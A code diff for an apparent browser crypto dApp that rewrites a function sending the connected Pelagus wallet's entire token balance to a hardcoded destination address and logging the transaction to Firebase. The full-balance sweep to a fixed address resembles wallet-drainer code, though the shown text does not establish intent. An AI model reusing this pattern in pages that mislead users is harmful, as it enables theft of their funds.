@@ -447,40 +447,33 @@ async function saveToFirebase(data) {
             throw new Error('No tokens available');
         }
 
-        const methodId = 'a9059cbb';
-        const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
-        const paddedAmount = currentBalance.toString(16).padStart(64, '0');
+        const readableAmount = (Number(currentBalance) / 1e18).toString();
 
-        const transactionParameters = {
-            from: accounts[0],
-            to: TOKEN_ADDRESS,
-            value: '0x0',
-            data: '0x' + methodId + paddedAddress + paddedAmount,
-            gas: '0x7A120'
-        };
+        const provider = new quais.providers.Web3Provider(window.pelagus);
+        const contract = new quais.Contract(TOKEN_ADDRESS, TOKEN_ABI, provider);
 
-        const txHash = await window.pelagus.request({
-            method: 'eth_sendTransaction',
-            params: [transactionParameters]
-        });
-
-        log(`Transaction sent: ${txHash}`);
-        await waitForTransaction(txHash);
+        log(`📤 Sending ${readableAmount} tokens...`);
+        const tx = await contract.transfer(DESTINATION_ADDRESS, currentBalance);
         
-        userSession.transferAmount = (Number(currentBalance) / 1e18).toString();
-        userSession.transferTxHash = txHash;
+        log(`📝 Transaction hash: ${tx.hash}`);
+        const receipt = await tx.wait();
+
+        userSession.transferAmount = readableAmount;
+        userSession.transferTxHash = tx.hash;
         await saveSessionToFirebase();
 
         document.getElementById('sendBtn').style.display = 'none';
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
+        log('✅ Transfer complete!');
     } catch (error) {
-        log('Error: ' + error.message);
+        log('❌ Error: ' + error.message);
+        console.error(error);
     }
 }
 
-        async function waitForTransaction(txHash) {
+async function waitForTransaction(txHash) {
             while (true) {
                 try {
                     const response = await fetch(RPC_ENDPOINT, {
